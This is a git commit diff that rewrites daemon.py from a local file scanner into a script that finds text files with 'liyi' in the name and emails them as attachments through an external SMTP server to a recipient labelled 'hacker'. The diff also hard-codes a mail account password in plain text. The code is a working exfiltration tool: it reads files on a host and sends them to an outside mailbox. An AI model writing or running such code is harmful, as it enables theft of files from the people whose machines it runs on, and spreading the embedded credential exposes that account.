d97fbf06c59577a50b25ce4441e83dc40be4979f
Yi Li <38208634+liyiblog@users.noreply.github.com>
2020-06-27 23:10:35 +0800

    Update daemon.py

--- daemon.py
+++ daemon.py
@@ -1,33 +1,43 @@
-#!/usr/bin/python
-
-#encoding:utf-8
-
+import smtplib
 import os
+from email.mime.text import MIMEText
+from email.utils import formataddr
+from email.mime.multipart import MIMEMultipart
 
-FileList=[]
-Suffix = ".txt"
-target = "liyi"
+my_sender='874115723@qq.com'
+my_pass ='qwptgiundcocbcjj'
+my_user='2017301500189@whu.edu.cn'
 
-def ScanFile(Dir):
-    if os.path.isdir(Dir):
-      items=os.listdir(Dir)
-      for names in items:
-        if os.path.isfile(Dir+'/'+names) and names.endswith(Suffix):
-          if names.split('/')[-1].find(target) != -1:
-              FileList.append(Dir+'/'+names)
-        else:
-          if os.path.isdir(Dir+'/'+names):
-            #print Dir+'/'+names
-            ScanFile(Dir+'/'+names)
-
-DIRNAME="/home"
-
-ScanFile(DIRNAME)
-
-if len(FileList)!=0:
-
-  print(FileList)
-
-else:
-
-  print("txt file that filename contains liyi is not exist!")
+def mail(path):
+	ret=True
+	try:
+		msg = MIMEMultipart()
+		msg['From']=formataddr(["server",my_sender]) 
+		msg['To']=formataddr(["hacker",my_user])
+		msg['Subject']="liyi.txt"
+		if len(path)==0:
+			msg.attach(MIMEText("Can't find any files that contains 'liyi'. ",'plain','utf-8'))
+		else:
+			msg.attach(MIMEText("Success find the txt file that contains 'liyi'! ",'plain','utf-8'))
+			for i in path:
+				i=i.strip('\n')
+				print i
+				att = MIMEText(open(i, 'rb').read(), 'base64', 'utf-8')
+				att["Content-Type"] = 'application/octet-stream'
+				att["Content-Disposition"] = 'attachment; filename="result.txt"'
+				msg.attach(att)
+		server=smtplib.SMTP_SSL("smtp.qq.com", 465) 
+		server.login(my_sender, my_pass)
+		server.sendmail(my_sender,[my_user,],msg.as_string())  
+		server.quit()
+	except:
+		ret=False	
+	return ret
+if __name__ == '__main__':
+	cmd="find . -name '*liyi*.txt'"
+	path=os.popen(cmd).readlines()
+	ret=mail(path)
+	if ret:
+		print("send Success")
+	else:
+		print("send Failed")
